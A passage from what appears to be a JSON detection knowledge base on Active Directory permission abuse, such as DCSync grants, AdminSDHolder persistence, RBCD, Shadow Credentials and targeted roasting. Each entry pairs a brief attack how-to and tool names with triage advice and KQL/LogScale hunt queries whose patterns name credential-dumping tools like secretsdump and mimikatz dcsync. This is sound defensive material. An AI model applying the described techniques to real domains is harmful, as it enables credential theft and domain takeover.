pwdLastSet changes. Alert on resets originating from outside the help desk.","events":"4724, 4738","mitigate":"Inventory User-Force-Change-Password ACEs and minimize delegation. Put sensitive accounts in protected groups. Detect anomalous resets and reduce the impact of unilateral resets with MFA/passwordless.","triage":"On the DC extract 4724 password-reset attempts where actor and target have no normal admin relationship (helpdesk to standard user), and correlate 4738 and pwdLastSet changes. It is malicious when the target is a privileged/service account and, right after the reset, 4624 or Kerberos (4768/4769) with those credentials appears from a different host; confirm PowerView Set-DomainUserPassword/changepasswd.py on the source via EDR. It is benign when a helpdesk account services a legitimate reset request (with a ticket) and the owner logs back in.","hunt":[{"plat":"Sentinel","t":"4724 resets where actor!=target fanning out to many targets from one principal = suspect / normal helpdesk = benign","q":"SecurityEvent\n| where TimeGenerated > ago(1d)\n| where EventID == 4724\n| where SubjectUserName != TargetUserName\n| where SubjectUserName !endswith \"$\"\n| summarize resets=dcount(TargetUserName), targets=make_set(TargetUserName,50) by SubjectUserName, Computer, bin(TimeGenerated,1h)\n| where resets > 5"},{"plat":"Sentinel","t":"4724 reset closely followed (<10m) by a 4738 change on the same account = takeover prep (suspect) / lone reset = benign","q":"SecurityEvent\n| where TimeGenerated > ago(1d)\n| where EventID in (4724,4738)\n| summarize reset=minif(TimeGenerated, EventID==4724), change=minif(TimeGenerated, EventID==4738), actors=make_set(SubjectUserName,10) by TargetUserName\n| where isnotempty(reset) and isnotempty(change) and change - reset between (0min .. 10min)"}],"huntcs":[{"plat":"LogScale","t":"Force-password-reset tooling off the helpdesk fleet = suspicious; IDM/helpdesk hosts = benign","q":"#event_simpleName=ProcessRollup2\n| CommandLine=/Set-DomainUserPassword|Set-ADAccountPassword|net(1)?\\s+user\\s+\\S+\\s+\\S+|\\/setpass/i\n| groupBy([ComputerName, UserName, FileName, ParentBaseFileName], function=count())\n| sort(count, order=desc)"}]},{"name":"AddSelf (Self-Membership)","aka":"Self ACE / SELF write member / AddSelf edge","phase":"privesc","group":"ACL / Object Permissions","mitre":"T1098","cve":"","sev":"High","summary":"A Self right to add yourself to a group. Abuse of delegated self-join configuration.","how":"A principal holding a Self-Membership write ACE on a group adds itself to that group to gain privileges. Shown as an AddSelf edge in BloodHound. Execute with `Add-DomainGroupMember -Identity <grp> -Members <self>`.","tools":"PowerView (Add-DomainGroupMember), net.exe, BloodHound (AddSelfエッジ)","detect":"Monitor 4728/4732/4756 for cases where the added principal and the target are identical. Detect self-additions to the member attribute via 5136.","events":"4728, 4732, 4756, 5136","mitigate":"Limit Self-Membership ACEs to the minimum necessary and never grant them on privileged groups. Periodically inventory group ACLs.","triage":"On the DC extract 4728/4732/4756 events where the added Member equals the acting Subject (same account) and correlate with 5136 self-addition to the member attribute. It is malicious when the target is a Tier0/privileged group, the self-add occurs outside change control/business hours, and privileged use (DCSync/4672) follows; confirm PowerView Add-DomainGroupMember with self as member on the source via EDR. It leans benign when an authorized operator self-registers into a non-Tier0 ops group per an approved change.","hunt":[{"plat":"Sentinel","t":"4728/4732/4756 where the actor equals the added member DN = self-add (suspect) / admin adding others = benign","q":"SecurityEvent\n| where TimeGenerated > ago(1d)\n| where EventID in (4728,4732,4756)\n| where MemberName has SubjectUserName   // added member DN contains the actor sAMAccountName\n| where SubjectUserName !endswith \"$\"\n| project TimeGenerated, Computer, EventID, Actor=SubjectUserName, SelfMember=MemberName, Group=TargetUserName"}],"huntcs":[{"plat":"Event Search","t":"Group add to a Tier0 group run under a non-admin user token = likely AddSelf; admin-context ops = benign","q":"event_simpleName=ProcessRollup2 (CommandLine=\"*group*/add*\" OR CommandLine=\"*Add-ADGroupMember*\" OR CommandLine=\"*Add-DomainGroupMember*\")\n| where IntegrityLevel!=\"System\" AND (like(CommandLine,\"%Domain Admins%\") OR like(CommandLine,\"%Administrators%\") OR like(CommandLine,\"%Enterprise Admins%\"))\n| stats count values(CommandLine) as cmds by ComputerName, UserName, IntegrityLevel"},{"plat":"Identity Protection","t":"Self-membership via a SELF ACE is DC-only (5136/4728); with no endpoint footprint rely on Identity Protection","q":"// Falcon Identity Protection detection: Privileged group membership change / anomalous self-add to a protected group (no Falcon EDR endpoint telemetry for the 4728/5136 self-ACE write)"}]},{"name":"Grant DCSync Rights (Replicating Directory Changes)","aka":"DCSync rights grant / DS-Replication-Get-Changes(-All) ACE addition","phase":"privesc","group":"ACL / Object Permissions","mitre":"T1003.006, T1222.001","cve":"","sev":"Critical","summary":"Add replication-rights ACEs to the domain object to enable DCSync from an arbitrary account.","how":"A principal holding WriteDacl/GenericAll on the domain root grants a controlled account DS-Replication-Get-Changes (GUID 1131f6aa) and Get-Changes-All (1131f6ad). That account can then replicate/extract the NTLM hashes of all users / krbtgt. Automated granting is also possible with ntlmrelayx `--escalate-user` or dacledit.py.","tools":"PowerView (Add-DomainObjectAcl -Rights DCSync), impacket (dacledit.py, secretsdump.py), ntlmrelayx.py, mimikatz (lsadump::dcsync)","detect":"Monitor changes via 5136 where replication-related GUIDs are added to the domain object's DACL. Alert on replication via 4662 (GUID 1131f6aa/1131f6ad) from a principal other than a DC.","events":"5136, 4662","mitigate":"Restrict replication rights to DCs/legitimate services only and inventory periodically. Enable SACL auditing on the domain object. Detect DRSUAPI replication from non-DCs via network/SIEM.","triage":"On the DC prioritize 5136 changes adding replication GUID ACEs (DS-Replication-Get-Changes 1131f6aa / -All 1131f6ad / -In-Filtered-Set 89e95b76-444d-4c62-991a-0facbeda640c) to a domain object's nTSecurityDescriptor. It is malicious when the granted principal then runs replication via 4662 (same GUIDs) from a non-DC host, followed by secretsdump/mimikatz lsadump::dcsync traces (EDR) or bulk hash extraction; also cross-read MDI Suspected DCSync attack. It is benign for replication between real DCs (DC$ accounts) or via an existing, by-design ACE for AAD Connect/backup.","hunt":[{"plat":"Sentinel","t":"5136 replication GUID (1131f6aa/1131f6ad) ACE added to the domain DACL = DCSync grant (suspect) / none = benign","q":"SecurityEvent\n| where TimeGenerated > ago(1d)\n| where EventID == 5136\n| where Properties has \"nTSecurityDescriptor\"\n| where Properties has_any (\"1131f6aa-9c07-11d1-f79f-00c04fc2dcd2\",\"1131f6ad-9c07-11d1-f79f-00c04fc2dcd2\",\"89e95b76-444d-4c62-991a-0facbeda640c\")\n| project TimeGenerated, Computer, Actor=SubjectUserName, ObjectName, OperationType, Properties"},{"plat":"Sentinel","t":"4662 replication-GUID access by a non-DC / user principal = DCSync run (suspect) / DC machine-to-machine = benign","q":"SecurityEvent\n| where TimeGenerated > ago(1d)\n| where EventID == 4662\n| where Properties has_any (\"1131f6aa-9c07-11d1-f79f-00c04fc2dcd2\",\"1131f6ad-9c07-11d1-f79f-00c04fc2dcd2\")\n| where SubjectUserName !endswith \"$\"\n| summarize count(), objects=make_set(ObjectName,10) by SubjectUserName, Computer, IpAddress, bin(TimeGenerated,1h)"},{"plat":"MDI","t":"Directory Services replication sourced from a non-DC host = DCSync (suspect) / legitimate DC replication = benign","q":"IdentityDirectoryEvents\n| where Timestamp > ago(1d)\n| where ActionType == \"Directory Services replication\"\n| where DeviceName !has \"DC\"   // source host is not a domain controller\n| project Timestamp, AccountName, AccountUpn, SourceHost=DeviceName, IPAddress, DestinationDeviceName"}],"huntcs":[{"plat":"LogScale","t":"Granting replication GUIDs / DS-Replication rights via tooling = suspicious; sanctioned delegation = benign","q":"#event_simpleName=ProcessRollup2\n| CommandLine=/1131f6aa-9c07-11d1-f79f-00c04fc2dcd2|1131f6ad-9c07-11d1-f79f-00c04fc2dcd2|1131f6ac-9c07-11d1-f79f-00c04fc2dcd2|DS-Replication-Get-Changes|Add-DomainObjectAcl.*Replicat/i\n| groupBy([ComputerName, UserName, FileName, CommandLine], function=count())\n| sort(count, order=desc)"},{"plat":"LogScale","t":"Non-DC host running dcsync/secretsdump tooling toward a DC = malicious; DC-to-DC replication = benign","q":"#event_simpleName=ProcessRollup2\n| CommandLine=/lsadump::dcsync|\\/dcsync|secretsdump|dcsync.*\\/domain/i\n| groupBy([ComputerName, UserName, FileName, ParentBaseFileName], function=count())\n| sort(count, order=desc)"}]},{"name":"AdminSDHolder / SDProp Abuse","aka":"AdminSDHolder container tampering / SDProp persistence","phase":"privesc","group":"ACL / Object Permissions","mitre":"T1098, T1222.001","cve":"","sev":"Critical","summary":"Adding your own ACE to the AdminSDHolder ACL propagates to all protected accounts via SDProp every 60 minutes, achieving persistence.","how":"Append a GenericAll/ForceChangePassword ACE for a controlled account to the nTSecurityDescriptor under CN=AdminSDHolder,CN=System. SDProp (default 60 minutes) auto-propagates it to protected objects like Domain Admins, becoming a persistent backdoor that is re-granted even if removed.","tools":"PowerView (Add-DomainObjectAcl), ADSIEdit, impacket dacledit.py","detect":"Give top priority to monitoring nTSecurityDescriptor changes on the AdminSDHolder object via 5136. Periodically scan for unexpected ACEs appearing on protected accounts (ACL anomalies on adminCount=1 objects). Correlate 4780 (SDProp application).","events":"5136, 4780, 4662","mitigate":"Strictly restrict writes to AdminSDHolder and enable SACL auditing. Periodically compare against a baseline ACL and remediate deviations. Continuously audit dsHeuristics and the ACLs of adminCount objects.","triage":"On the DC give top priority to 5136 nTSecurityDescriptor changes on CN=AdminSDHolder,CN=System and extract added GenericAll/ForceChangePassword ACEs for a controlled account. It is malicious when, after the ~60-minute SDProp run, that ACE propagates to adminCount=1 protected objects (e.g. Domain Admins) (correlate 4780 SDProp application) and reappears after deletion (a persistence backdoor); confirm PowerView/dacledit.py/ADSIEdit on the source via EDR. It is benign when AD-ops legitimately change AdminSDHolder delegation per change control and the added principal is a known admin group.","hunt":[{"plat":"Sentinel","t":"5136 nTSecurityDescriptor change on AdminSDHolder = SDProp persistence (suspect) / no change = benign","q":"SecurityEvent\n| where TimeGenerated > ago(1d)\n| where EventID == 5136\n| where ObjectName has \"CN=AdminSDHolder\"\n| where Properties has \"nTSecurityDescriptor\"\n| project TimeGenerated, Computer, Actor=SubjectUserName, ObjectName, OperationType, Properties"},{"plat":"Sentinel","t":"Burst of 4780 (SDProp apply) correlating with an AdminSDHolder edit = malicious propagation (suspect) / single periodic run = benign","q":"SecurityEvent\n| where TimeGenerated > ago(1d)\n| where EventID == 4780\n| summarize applied=count(), accounts=make_set(TargetUserName,50) by Computer, bin(TimeGenerated,1h)\n| where applied > 5   // off-cycle SDProp fan-out beyond the hourly baseline"}],"huntcs":[{"plat":"Event Search","t":"Tooling that writes ACLs on the AdminSDHolder container = persistence, suspicious; it is virtually never touched normally","q":"event_simpleName=ProcessRollup2\n| search CommandLine=\"*AdminSDHolder*\" AND (CommandLine=\"*Add-DomainObjectAcl*\" OR CommandLine=\"*dsacls*\" OR CommandLine=\"*Set-Acl*\" OR CommandLine=\"*nTSecurityDescriptor*\" OR CommandLine=\"*Add-ADPermission*\")\n| stats count values(CommandLine) as cmds by ComputerName, UserName, FileName, ParentBaseFileName\n| sort - count"}]},{"name":"GPO Permission Abuse (WriteDacl/GenericWrite on GPO)","aka":"GPO abuse / SharpGPOAbuse / gPCFileSysPath tampering","phase":"privesc","group":"ACL / Object Permissions","mitre":"T1484.001, T1053.005","cve":"","sev":"Critical","summary":"Write access to a GPO object lets an attacker push immediate tasks or scripts to every machine in the linked OU/domain, achieving code execution.","how":"A principal with WriteProperty/GenericWrite/WriteDacl on a GPO rewrites the GPT's SYSVOL files (e.g. scheduledtasks.xml) or attributes to plant immediate scheduled tasks, startup scripts, or local-admin additions. These execute on every computer/user under the linked OU.","tools":"SharpGPOAbuse, pyGPOAbuse, PowerView (Get-DomainGPO/New-GPOImmediateTask), BloodHound (GenericWrite on GPO)","detect":"Watch 5136 for GPC object changes; use FIM to detect tampering of GPT.ini/gPCMachineExtensionNames/Scheduled Tasks files on SYSVOL. Monitor for versionNumber spikes and suspicious immediate-task deployments. Correlate 4698 (task creation) on the endpoint side.","events":"5136, 4698, 5145(SYSVOL共有アクセス)","mitigate":"Minimize GPO delegation so only Tier0 can edit. Configure FIM on SYSVOL GPT files. Alert on GPLink/GPO edits to critical OUs (including Domain Controllers).","triage":"On the DC security log pull 5136 for the changed GPC object, check the gPCMachineExtensionNames/versionNumber spike and the Subject (modifier), and correlate whether SYSVOL GPT.ini/ScheduledTasks.xml/startup scripts were tampered at the same time via FIM or 5145 (RelativeTargetName under Policies). If the modifier is a non-GPO-admin user/offensive account and it chains into 4698 (task creation) plus suspicious process execution on machines under the linked OU, it is malicious. If the change originates from GPMC/SCCM/AGPM or a legitimate GPO-admin PAW and matches a change ticket, expected maintenance window, and known operational scripts, it is benign.","hunt":[{"plat":"Sentinel","t":"5136 change to a Policies-container GPC DACL/attribute by a user principal = GPO abuse (suspect) / normal GPMC edit = benign","q":"SecurityEvent\n| where TimeGenerated > ago(1d)\n| where EventID == 5136\n| where ObjectName has \"CN=Policies,CN=System\"\n| where SubjectUserName !endswith \"$\"\n| project TimeGenerated, Computer, Actor=SubjectUserName, ObjectName, OperationType, Properties"},{"plat":"MDE","t":"User-initiated write to SYSVOL ScheduledTasks.xml/GPT.INI/Registry.pol = SharpGPOAbuse (suspect) / gpsvc SYSTEM = benign","q":"DeviceFileEvents\n| where Timestamp > ago(1d)\n| where FolderPath has \"\\\\SYSVOL\\\\\" and FolderPath has \"\\\\Policies\\\\\"\n| where FileName in~ (\"ScheduledTasks.xml\",\"GPT.INI\",\"Registry.pol\")\n| where InitiatingProcessAccountName !endswith \"$\"\n| project Timestamp, DeviceName, FileName, FolderPath, InitiatingProcessFileName, InitiatingProcessAccountName, InitiatingProcessCommandLine"}],"huntcs":[{"plat":"LogScale","t":"SharpGPOAbuse / GPO immediate-task tooling = malicious GPO weaponization; GPMC edits = benign","q":"#event_simpleName=ProcessRollup2\n| CommandLine=/SharpGPOAbuse|New-GPOImmediateTask|gPCMachineExtensionNames|gPCFileSysPath|ScheduledTasks\\.xml|Set-GPPrefRegistryValue/i\n| groupBy([ComputerName, UserName, FileName, ParentBaseFileName], function=count())\n| sort(count, order=desc)"},{"plat":"Event Search","t":"Endpoint-side capture of a GPO-pushed immediate scheduled task = suspicious; standard tasks = benign","q":"event_simpleName=ScheduledTaskRegistered\n| search TaskExecCommand=\"*powershell*\" OR TaskExecCommand=\"*cmd*\" OR TaskExecCommand=\"*\\\\\\\\*\" OR TaskExecCommand=\"*.exe*\"\n| stats count dc(ComputerName) as hosts values(TaskExecCommand) as cmd by TaskName, TaskAuthor\n| where hosts>1\n| sort - hosts"}]},{"name":"GPLink Abuse (WriteProperty on gPLink of OU/Domain)","aka":"GPLink edge / OU gPLink rewrite","phase":"privesc","group":"ACL / Object Permissions","mitre":"T1484.001","cve":"","sev":"High","summary":"Write access to an OU/domain gPLink attribute lets an attacker link an attacker-controlled GPO to the target OU and take over its machines.","how":"A principal with write access to the gPLink attribute of an OU/site/domain links a self-made or existing malicious GPO to the target OU. The policy applies to child computers/users, leading to code execution or privilege escalation. Visualized via BloodHound's GPLink edge.","tools":"PowerView (Set-DomainObject gPLink), pyGPOAbuse, SharpGPOAbuse, BloodHound","detect":"Watch 5136 for gPLink attribute changes on OU/domain objects. Make unexpected GPO link additions — especially link changes to the Domain Controllers OU — the top-priority alert.","events":"5136","mitigate":"Minimize gPLink write delegation on OUs. Detect link changes to critical OUs in real time. Baseline GPO link configuration and remediate deviations.","triage":"On the DC pull 5136 for gPLink attribute changes on OU/site/domain objects and check whether the added GPO GUID is an approved GPO and whether the Subject is a domain/OU admin. Linking an unexpected or newly-created GPO — especially to the Domain Controllers OU or a high-privilege OU — by a low-privilege principal, followed by new GPO application and suspicious 4688/4698 on downstream hosts, is malicious. A GPO team relinking via GMPC per a change ticket (existing approved GPO, scheduled window, PAW-sourced) is benign.","hunt":[{"plat":"Sentinel","t":"5136 gPLink change, especially a new link on the Domain Controllers OU = top-priority suspect / planned link on a normal OU = benign","q":"SecurityEvent\n| where TimeGenerated > ago(1d)\n| where EventID == 5136\n| where Properties has \"gPLink\"\n| extend HitsDC_OU = ObjectName has \"OU=Domain Controllers\"\n| where SubjectUserName !endswith \"$\" or HitsDC_OU\n| project TimeGenerated, Computer, Actor=SubjectUserName, ObjectName, HitsDC_OU, OperationType, Properties\n| order by HitsDC_OU desc, TimeGenerated desc"}],"huntcs":[{"plat":"LogScale","t":"gPLink rewrite tooling against an OU/Domain (esp. Domain Controllers OU) = suspicious; sanctioned linking = benign","q":"#event_simpleName=ProcessRollup2\n| CommandLine=/gPLink|gplink|New-GPLink|Set-DomainObject.*gplink|Set-ADObject.*gPLink/i\n| groupBy([ComputerName, UserName, FileName, CommandLine], function=count())\n| sort(count, order=desc)"}]},{"name":"Resource-Based Constrained Delegation (RBCD) Write","aka":"AddAllowedToAct / msDS-AllowedToActOnBehalfOfOtherIdentity write","phase":"privesc","group":"ACL / Object Permissions","mitre":"T1098, T1550.003","cve":"","sev":"Critical","summary":"Write the target computer's msDS-AllowedToActOnBehalfOf attribute, then use S4U2Self from an attacker-controlled account to impersonate any user.","how":"A principal with GenericWrite/GenericAll/WriteProperty (or WriteAccountRestrictions) on the target computer writes the SID of a controlled machine account (or a new one created via the default MachineAccountQuota of 10) into msDS-AllowedToActOnBehalfOfOtherIdentity. Then S4U2Self+S4U2Proxy obtains a CIFS/HOST service ticket to the target as Administrator, yielding local admin.","tools":"PowerView (Set-DomainRBCD), impacket (rbcd.py, addcomputer.py, getST.py), Rubeus (s4u), StandIn","detect":"Watch 5136 for changes to the msDS-AllowedToActOnBehalfOfOtherIdentity attribute. Use 4741 (computer account creation) to catch MAQ abuse. Correlate 4769 for S4U2Proxy (0x40810000-family flags) or ticket requests from foreign-domain principals.","events":"5136, 4741, 4769, 4624","mitigate":"Set ms-DS-MachineAccountQuota to 0 to block machine creation by regular users. Minimize write delegation on computer objects. Alert on msDS-AllowedToActOnBehalfOf changes and eliminate GenericWrite on computers via Tiering.","triage":"On the DC pull 5136 for writes to the target computer's msDS-AllowedToActOnBehalfOfOtherIdentity, check which machine-account SID was written and whether the writer is a legitimate delegation admin. If a preceding 4741 (computer creation abusing MachineAccountQuota) and 4769 S4U2Self/S4U2Proxy requests (transited-services, from an out-of-domain/newly-created machine principal) chain against the same target service (CIFS/HOST), followed by 4624 LogonType3 + 4672 on the target, it is malicious. Documented delegation setup by known service accounts (SCCM, clustering, IIS/SQL, Hyper-V live migration) is benign.","hunt":[{"plat":"Sentinel","t":"5136 write to msDS-AllowedToActOnBehalfOfOtherIdentity = RBCD planted (suspect) / no change = benign","q":"SecurityEvent\n| where TimeGenerated > ago(1d)\n| where EventID == 5136\n| where Properties has \"msDS-AllowedToActOnBehalfOfOtherIdentity\"\n| project TimeGenerated, Computer, Actor=SubjectUserName, TargetComputer=ObjectName, OperationType, Properties"},{"plat":"Sentinel","t":"4741 computer account created by a low-priv user = MachineAccountQuota abuse (suspect) / provisioning admin = benign","q":"SecurityEvent\n| where TimeGenerated > ago(1d)\n| where EventID == 4741\n| where SubjectUserName !endswith \"$\"\n| summarize created=count(), machines=make_set(TargetUserName,20) by SubjectUserName, Computer, bin(TimeGenerated,1h)\n| where created >= 1"}],"huntcs":[{"plat":"LogScale","t":"RBCD attribute write or rogue machine-account creation (Powermad/MAQ) = suspicious; sanctioned delegation = benign","q":"#event_simpleName=ProcessRollup2\n| CommandLine=/msDS-AllowedToActOnBehalfOfOtherIdentity|PrincipalsAllowedToDelegateToAccount|New-MachineAccount|Set-ADComputer.*Principals|Set-DomainRBCD/i\n| groupBy([ComputerName, UserName, FileName, ParentBaseFileName], function=count())\n| sort(count, order=desc)"},{"plat":"LogScale","t":"Rubeus s4u (/impersonate + /msdsspn) forging RBCD tickets = malicious; legit S4U apps = benign","q":"#event_simpleName=ProcessRollup2\n| CommandLine=/rubeus.*s4u|s4u.*\\/impersonate|\\/msdsspn|\\/altservice/i\n| groupBy([ComputerName, UserName, FileName, ParentBaseFileName], function=count())\n| sort(count, order=desc)"}]},{"name":"Shadow Credentials (msDS-KeyCredentialLink Write)","aka":"AddKeyCredentialLink / Whisker / pyWhisker / Key Trust abuse","phase":"privesc","group":"ACL / Object Permissions","mitre":"T1098, T1649, T1556","cve":"","sev":"Critical","summary":"Add an attacker certificate key to the target's msDS-KeyCredentialLink to authenticate as the target via PKINIT and also recover its NTLM hash.","how":"A principal with GenericWrite/GenericAll/AddKeyCredentialLink on a target user/computer adds a self-made public key to the msDS-KeyCredentialLink attribute. Using the matching private key it performs PKINIT (certificate-based Kerberos) auth to obtain a TGT, then via UnPAC also retrieves the target's NTLM hash. No password change is required, making it highly stealthy.","tools":"Whisker, pyWhisker, Certipy (shadow auto), Rubeus (asktgt /certificate), ntlmrelayx (--shadow-credentials)","detect":"Watch 5136 for msDS-KeyCredentialLink attribute changes (SACL required). Correlate 4768 (certificate logon, with Certificate info) on PKINIT auth. Detect KeyCredential additions to unexpected objects.","events":"5136, 4768, 4662","mitigate":"Eliminate msDS-KeyCredentialLink write delegation and enable SACL auditing. Restrict key trust if AD CS/Key Trust is not needed. Inventory existing KeyCredentials via BloodHound/PowerShell and remove rogue entries.","triage":"On the DC pull 5136 (SACL required) for msDS-KeyCredentialLink additions, check the modifier, target object (user/computer), and whether the added KeyCredential comes from legitimate device registration. If an unexpected principal adds a KeyCredential and the target account then shows 4768 (certificate/PKINIT logon with Certificate Information) followed by TGT acquisition and lateral 4624 LogonType3, it is malicious. Legitimate key enrollment via Windows Hello for Business / Entra join / device registration (NGC), matching the owner's device and enrollment workflow, is benign.","hunt":[{"plat":"Sentinel","t":"5136 value-add (%%14674) to msDS-KeyCredentialLink = Shadow Credentials planted (suspect) / legit WHfB/AADConnect enrol = benign","q":"SecurityEvent\n| where TimeGenerated > ago(1d)\n| where EventID == 5136\n| where Properties has \"msDS-KeyCredentialLink\"\n| where OperationType == \"%%14674\"   // Value Added\n| where SubjectUserName !endswith \"$\"\n| project TimeGenerated, Computer, Actor=SubjectUserName, TargetObject=ObjectName, OperationType, Properties"},{"plat":"Sentinel","t":"4768 PKINIT (certificate logon) right after a KeyCredential add on the same target = abuse realized (suspect) / add-only = benign","q":"SecurityEvent\n| where TimeGenerated > ago(1d)\n| where EventID == 4768\n| where Properties has \"Certificate\"   // PKINIT smartcard/cert logon carries certificate fields\n| summarize pkinit=count(), src=make_set(IpAddress,10) by TargetUserName, bin(TimeGenerated,1h)\n| where pkinit > 0"}],"huntcs":[{"plat":"LogScale","t":"Whisker/pyWhisker/Certipy-shadow writing msDS-KeyCredentialLink = suspicious; genuine WHfB enrollment = benign","q":"#event_simpleName=ProcessRollup2\n| CommandLine=/msDS-KeyCredentialLink|Whisker|pyWhisker|Set-ADComputer.*KeyCredential|certipy.*shadow|Add-ADComputerKeyCredential/i\n| groupBy([ComputerName, UserName, FileName, ParentBaseFileName], function=count())\n| sort(count, order=desc)"},{"plat":"Identity Protection","t":"PKINIT certificate logon (4768) is DC-only; correlate Key-Trust abuse authentication via Identity Protection","q":"// Falcon Identity Protection detection: Shadow Credentials / suspicious PKINIT certificate authentication (msDS-KeyCredentialLink abuse not visible in Falcon EDR endpoint telemetry)"}]},{"name":"Targeted Kerberoasting (WriteSPN / servicePrincipalName Write)","aka":"WriteSPN edge / targetedKerberoast","phase":"privesc","group":"ACL / Object Permissions","mitre":"T1558.003","cve":"","sev":"High","summary":"Temporarily assign an SPN to a target user, request a TGS, and crack the password offline.","how":"A principal with GenericWrite/GenericAll/WriteProperty (servicePrincipalName) on a target user assigns an arbitrary SPN, requests that user's TGS-REP to obtain an RC4-encrypted hash, and cracks the plaintext password with Hashcat. The SPN is removed afterward to erase traces.","tools":"PowerView (Set-DomainObject servicePrincipalName), Rubeus (kerberoast), targetedKerberoast.py, impacket GetUserSPNs.py, Hashcat","detect":"Watch 5136 for servicePrincipalName additions (especially SPNs on individual users). Use 4769 to detect spikes in RC4 (etype 0x17) TGS requests or access to honey SPNs. Correlate the SPN-add -> immediate 4769 -> delete pattern.","events":"5136, 4769, 4738","mitigate":"Use gMSA or 25+ character random passwords for service accounts. Eliminate servicePrincipalName write delegation. Disable RC4 (enforce AES) to raise Kerberoast resistance, and detect via honey-SPN accounts.","triage":"On the DC pull 5136 for servicePrincipalName additions — especially an SPN granted to a normal user with none before — and the modifier (also read 4738). If SPN-add is followed within seconds/minutes by 4769 TGS requests for that account with Ticket Encryption Type 0x17 (RC4), then SPN deletion — the add/request/delete short-window pattern — or honey-SPN access appears, it is malicious. SPN registration for a new service account during app onboarding via an SPN management tool, using AES (0x12), in business hours, with a change ticket and no deletion, is benign.","hunt":[{"plat":"Sentinel","t":"5136 servicePrincipalName added onto a regular user object = targeted Kerberoast (suspect) / legit SPN on service/gMSA = benign","q":"SecurityEvent\n| where TimeGenerated > ago(1d)\n| where EventID == 5136\n| where Properties has \"servicePrincipalName\"\n| where OperationType == \"%%14674\"   // Value Added\n| where ObjectName has \"CN=Users\" or ObjectType =~ \"user\"\n| project TimeGenerated, Computer, Actor=SubjectUserName, ObjectName, OperationType, Properties"},{"plat":"Sentinel","t":"4769 RC4 (0x17) TGS requests fanning from one principal to many SPNs = Kerberoast (suspect) / single service normal use = benign","q":"SecurityEvent\n| where TimeGenerated > ago(1d)\n| where EventID == 4769\n| where TicketEncryptionType == \"0x17\"\n| where ServiceName !endswith \"$\" and ServiceName != \"krbtgt\"\n| summarize services=dcount(ServiceName), svc=make_set(ServiceName,50) by TargetUserName, IpAddress, bin(TimeGenerated,1h)\n| where services > 5"}],"huntcs":[{"plat":"LogScale","t":"SPN write on a user (setspn -a / Set-DomainObject SPN) then Rubeus kerberoast = targeted roast; service registration = benign","q":"#event_simpleName=ProcessRollup2\n| CommandLine=/setspn\\s+-a|servicePrincipalName|Set-DomainObject.*serviceprincipalname|rubeus.*kerberoast|Invoke-Kerberoast|GetUserSPNs/i\n| groupBy([ComputerName, UserName, FileName, CommandLine], function=count())\n| sort(count, order=desc)"},{"plat":"Identity Protection","t":"RC4 (0x17) TGS spikes / honey-SPN access (4769) are DC-only; detect via Identity Protection","q":"// Falcon Identity Protection detection: Kerberoasting (RC4 TGS request anomaly / honey-SPN access) — 4769 etype is not collected by Falcon EDR"}]},{"name":"Targeted AS-REP Roasting (WriteAccountRestrictions / UAC Write)","aka":"WriteAccountRestrictions edge / DONT_REQ_PREAUTH setting","phase":"privesc","group":"ACL / Object Permissions","mitre":"T1558.004","cve":"","sev":"High","summary":"Set DONT_REQ_PREAUTH on the target's userAccountControl to disable Kerberos pre-auth, then crack the AS-REP offline.","how":"A principal with GenericWrite/GenericAll/WriteProperty (userAccountControl) or WriteAccountRestrictions on a target user sets the DONT_REQ_PREAUTH (0x400000) flag. Without pre-auth, the AS-REP is obtained and its RC4 portion cracked with Hashcat, then the flag is reverted. WriteAccountRestrictions can also rewrite RBCD-related attributes.","tools":"PowerView (Set-DomainObject userAccountControl), Rubeus (asreproast), impacket GetNPUsers.py, Hashcat","detect":"Watch 5136 for userAccountControl changes (DONT_REQ_PREAUTH bit). Detect 4738 (account change, pre-auth disabled). Correlate 4768 for AS-REQs without pre-auth (PreAuthType=0).","events":"5136, 4738, 4768","mitigate":"Eliminate userAccountControl write delegation. Periodically inventory DONT_REQ_PREAUTH accounts and remove permanent settings. Enforce AES to raise cracking difficulty and mandate strong passwords.","triage":"On the DC pull 5136 for userAccountControl changes (setting the DONT_REQ_PREAUTH 0x400000 bit) and 4738 (pre-auth disabled), checking the modifier and target user. If the flag is set, immediately followed by 4768 AS-REQ/AS-REP with Pre-Authentication Type=0 (RC4), then the flag is reverted — the set/roast/revert short-window pattern — it is malicious. An account that permanently requires DONT_REQ_PREAUTH for a legacy appliance or UNIX/Kerberos interop, with a documented, persistent setting by a legitimate admin, is benign.","hunt":[{"plat":"Sentinel","t":"5136/4738 setting DONT_REQ_PREAUTH (0x400000) in userAccountControl = AS-REP prep (suspect) / ordinary UAC edit = benign","q":"SecurityEvent\n| where TimeGenerated > ago(1d)\n| where EventID in (5136,4738)\n| where Properties has \"userAccountControl\"\n| where Properties has \"DONT_REQ_PREAUTH\" or Properties has \"0x400000\" or Properties has \"4194304\"\n| project TimeGenerated, Computer, Actor=SubjectUserName, Target=coalesce(ObjectName,TargetUserName), EventID, Properties"},{"plat":"Sentinel","t":"4768 RC4 (0x17) AS-REQ fanning from one source to many accounts = AS-REP roasting (suspect) / normal logons = benign","q":"SecurityEvent\n| where TimeGenerated > ago(1d)\n| where EventID == 4768\n| where TicketEncryptionType == \"0x17\"\n| summarize reqs=count(), users=dcount(TargetUserName), accounts=make_set(TargetUserName,50) by IpAddress, bin(TimeGenerated,1h)\n| where users > 10"}],"huntcs":[{"plat":"LogScale","t":"Setting DONT_REQ_PREAUTH (UAC 4194304) then Rubeus asreproast = targeted AS-REP roast; normal UAC change = benign","q":"#event_simpleName=ProcessRollup2\n| CommandLine=/DONT_REQ_PREAUTH|4194304|userAccountControl|Set-DomainObject.*useraccountcontrol|rubeus.*asreproast|Get-ASREPHash|Invoke-ASREPRoast/i\n| groupBy([ComputerName, UserName, FileName, CommandLine], function=count())\n| sort(count, order=desc)"},{"plat":"Identity Protection","t":"Pre-auth-disabled AS-REQ (PreAuthType=0) is DC-only (4768); detect AS-REP Roasting via Identity Protection","q":"// Falcon Identity Protection detection: AS-REP Roasting / accounts with Kerberos pre-authentication disabled (4768 PreAuthType not collected by Falcon EDR)"}]},{"name":"SyncLAPSPassword","aka":"SyncLAPSPassword edge / LAPS attribute replication retrieval","phase":"privesc","group":"ACL / Object Permissions","mitre":"T1003.006, T1555","cve":"","sev":"High","summary":"Retrieve LAPS passwords via directory replication using the combined GetChanges + ReadLAPS-equivalent rights.","how":"A principal holding both DS-Replication-Get-Changes and read access to the LAPS attribute (ms-Mcs-AdmPwd) retrieves LAPS passwords over DRSUAPI replication. Represented as the SyncLAPSPassword edge in BloodHound CE, it obtains local-admin credentials via a path close to DCSync.","tools":"impacket secretsdump.py(-just-dc系), 